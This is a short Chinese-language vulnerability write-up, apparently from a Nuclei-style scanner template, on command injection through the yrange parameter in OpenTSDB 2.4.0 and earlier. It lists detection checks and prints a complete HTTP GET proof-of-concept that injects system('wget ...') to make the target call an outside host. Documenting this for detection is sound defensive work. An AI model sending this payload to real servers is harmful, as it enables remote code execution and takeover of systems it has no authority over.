验证漏洞存在方法
    - 发送包含恶意yrange参数的HTTP GET请求到目标OpenTSDB实例
    - 检查响应中是否包含"plotted"、"timing"、"cachehit"等关键词
    - 验证响应状态码是否为200且Content-Type为application/json

漏洞利用方法
    - OpenTSDB 2.4.0及更早版本存在远程代码执行漏洞，攻击者可以通过yrange参数向/tmp目录写入gnuplot文件来执行任意命令
    - 漏洞利用PoC：
```
GET /q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget http://{{interactsh-url}}')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1
Host: {{BaseURL}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
Connection: close

```
    - 该PoC通过yrange参数注入system()函数调用，尝试从远程服务器下载文件
    - 成功利用后，攻击者可以在目标系统上执行任意命令，获取敏感信息，修改数据或完全控制系统
